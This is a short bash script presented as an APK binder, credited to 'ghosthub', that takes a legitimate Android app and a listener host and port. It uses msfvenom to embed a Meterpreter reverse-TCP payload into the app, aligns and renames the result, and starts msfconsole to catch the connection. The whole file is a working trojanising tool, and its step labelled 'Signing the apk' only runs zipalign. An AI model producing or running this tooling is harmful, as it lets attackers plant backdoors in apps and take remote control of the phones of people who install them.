#Author - ghosthub (b@b@y)
clear
#Banner Start
echo -e "\e[31m                                                              \e[0m"
echo -e "\e[31m ▄▄▄       ██▓███   ██ ▄█▀ ▄▄▄▄    ██▓ ███▄    █ ▓█████▄ ▓█████  ██▀███  \e[0m";
echo -e "\e[31m▒████▄    ▓██░  ██▒ ██▄█▒ ▓█████▄ ▓██▒ ██ ▀█   █ ▒██▀ ██▌▓█   ▀ ▓██ ▒ ██▒\e[0m";
echo -e "\e[31m▒██  ▀█▄  ▓██░ ██▓▒▓███▄░ ▒██▒ ▄██▒██▒▓██  ▀█ ██▒░██   █▌▒███   ▓██ ░▄█ ▒\e[0m";
echo -e "\e[31m░██▄▄▄▄██ ▒██▄█▓▒ ▒▓██ █▄ ▒██░█▀  ░██░▓██▒  ▐▌██▒░▓█▄   ▌▒▓█  ▄ ▒██▀▀█▄  \e[0m";
echo -e "\e[31m ▓█   ▓██▒▒██▒ ░  ░▒██▒ █▄░▓█  ▀█▓░██░▒██░   ▓██░░▒████▓ ░▒████▒░██▓ ▒██▒\e[0m";
echo -e "\e[31m ▒▒   ▓▒█░▒▓▒░ ░  ░▒ ▒▒ ▓▒░▒▓███▀▒░▓  ░ ▒░   ▒ ▒  ▒▒▓  ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░\e[0m";
echo -e "\e[31m  ▒   ▒▒ ░░▒ ░     ░ ░▒ ▒░▒░▒   ░  ▒ ░░ ░░   ░ ▒░ ░ ▒  ▒  ░ ░  ░  ░▒ ░ ▒░\e[0m";
echo -e "\e[31m  ░   ▒   ░░       ░ ░░ ░  ░    ░  ▒ ░   ░   ░ ░  ░ ░  ░    ░     ░░   ░ \e[0m";
echo -e "\e[31m      ░  ░         ░  ░    ░       ░           ░    ░       ░  ░   ░     \e[0m";
echo -e "\e[31m                                ░                 ░                      \e[0m";
echo -e " Author  = ghosthub (b@b@y)               "
echo -e "\e[34m Website = https://iconicbabay.github.io/index/             \e[0m "
echo -e "\e[49m                                 \e[2m"

#Bind Backdoor
read -p "[*]Enter filepath of apk#~: " path
read -p "[*]Enter output payload name#~: " payload
read -p "[*]Enter lhost#~: " lhost
read -p "[*]Enter lport#~: " lport
echo -e "\e[31m[*]APK Reverse Engineering Started..;p\e[0m"
msfvenom -x $path -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport R> binded.apk

#Signing the apk
echo -e "\e[31m                                                 \e[2m"
echo -e "[-]Signing the apk                             "
zipalign -v 4 binded.apk binded-signed.apk

#listner start
rm binded.apk && mv binded-signed.apk $payload.apk
echo -e "\e[34m                                                \e[2m";
read -p "[-]Start listner(Enter) or Close (Ctrl+c) : " listner
msfconsole
